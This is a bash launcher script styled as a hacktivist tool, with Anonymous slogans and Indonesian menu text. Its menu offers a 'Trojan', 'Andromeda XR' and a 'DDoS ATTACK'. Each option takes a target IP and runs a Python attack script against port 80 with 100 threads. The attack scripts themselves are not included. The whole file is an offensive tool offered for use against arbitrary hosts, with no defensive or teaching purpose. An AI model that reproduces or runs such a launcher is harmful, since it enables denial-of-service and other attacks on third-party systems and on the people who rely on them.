blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
clear
toilet -f slant " THREE IN ONE " |lolcat
figlet -f standard "      WHITE HAT" | lolcat
date | lolcat | screenfetch -A linux
echo '\033[01;32m'
echo
echo
echo $red"=========================================================="
echo $yellow"AUTHOR TOOLS"
echo $yellow"@MR.WHITE(13)"
echo $red"=========================================================="
echo $white"WE ARE ANONYMOUS"
echo $white"WE ARE LEGION"
echo $white"WE DO NOT FORGIVE"
echo $white"WE DO NOT FORGET"
echo $white"EXPECT US"
echo $red"=========================================================="
echo $yellow"THANKS ALL MEMBER"
echo $yellow"TANPA KALIAN SAYA BUKAN APA APA"
echo $red"=========================================================="
echo $yellow"TOOLS THREE IN ONE         "
echo $yellow"SPECIAL TOOLS SAVE PALESTINA        "
echo $yellow"GUNAKAN TOOLS INI DENGAN BIJAK     "
echo $red"=========================================================="
echo $purple"                 MENU"
echo $red"=========================================================="
echo $green"[1].TROJAN WIN32,64.NT"
echo $green"[2].ANDROMEDA XR"
echo $green"[3].DDoS ATTACK"
echo $red"=========================================================="
echo $yellow"MASUKAN PILIHAN ANDA"
read -p "PILIH>>==>" bro;
echo
if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
toilet -f slant " WIN32,64.NT " |lolcat
echo $yellow"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python win.32.64.NT.py -s$ipt -p80 -t100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
toilet -f slant " ANDROMEDA XR " |lolcat
echo $yellow"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python andromeda.py -s$ipt -p80 -t100
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
toilet -f slant " DDoS ATTACK " |lolcat
echo $yellow"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python ddos.py -s$ipt -p80 -t100
fi